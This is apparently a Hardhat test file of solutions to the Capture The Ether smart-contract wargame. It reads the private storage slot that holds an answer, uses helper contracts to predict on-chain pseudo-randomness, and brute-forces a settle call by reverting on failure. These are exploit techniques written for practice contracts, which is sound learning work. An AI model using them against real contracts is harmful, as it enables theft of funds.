const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Capture The Ether", function () {
  it.skip("Guess The Secret Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheSecretNumberChallenge",
      "0xe5D07A2789fC30c9A471d0aBe055A6e18059dc2e"
    );

    const Guesser = await ethers.getContractFactory("Guesser");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    let answerHash =
      "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365";

    console.log(await guesser.guessAnswer()); //170

    await Contract.guess(await guesser.guessAnswer(), {
      value: "1000000000000000000",
    });
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Guess The Random Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheRandomNumberChallenge",
      "0xd628E60ad0d54e1A307ae253c63C6B57d29992a5"
    );

    // get the slot 0 of the storage where the answer is saved
    let slot0 = await web3.eth.getStorageAt(Contract.address, 0);

    //convert the hexa value to int and call guess
    await Contract.guess(parseInt(slot0), { value: "1000000000000000000" });
    expect(await Contract.isComplete()).to.be.true;
  });

  it.skip("Guess The New Number", async function () {
    const Contract = await ethers.getContractAt(
      "GuessTheNewNumberChallenge",
      "0x9bcB868F01615F7EEEF9F6b821C3C2c88fBb0f34"
    );

    // deploy the contract that imitates the generation of the answer
    const Guesser = await ethers.getContractFactory("GuesserNewNumber");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    // call the function that guess the number and call guess to the challenge contract
    await guesser.guessTheNumber({ value: "1000000000000000000" });

    // recover the ethers from the guesser contract
    await guesser.withdraw();
    expect(await Contract.isComplete()).to.be.true;
  });

  it("Predict The future", async function () {
    const { mine } = require("@nomicfoundation/hardhat-network-helpers");
    const Contract = await ethers.getContractAt(
      "PredictTheFutureChallenge",
      "0x958e9d80313d8ed09d12e865980bc107C7fc5353"
    );
    // deploy the contract that imitates the generation of the answer
    const Guesser = await ethers.getContractFactory("Predictor");
    const guesser = await Guesser.deploy();
    await guesser.deployed();

    // set the guess in the challenge contract
    await guesser.callLockInGuess(Contract.address, {
      value: "1000000000000000000",
    });

    // mine one block
    await mine();

    // brute force calling settle() and reverting in failure so the guesser varaible isnt deleted
    for (let i = 0; i < 100; i++) {
      try {
        await guesser.makeTheGuess(Contract.address);
        if (await Contract.isComplete()) {
          break;
        }
      } catch (error) {}
    }

    expect(await Contract.isComplete()).to.be.true;
  });
});
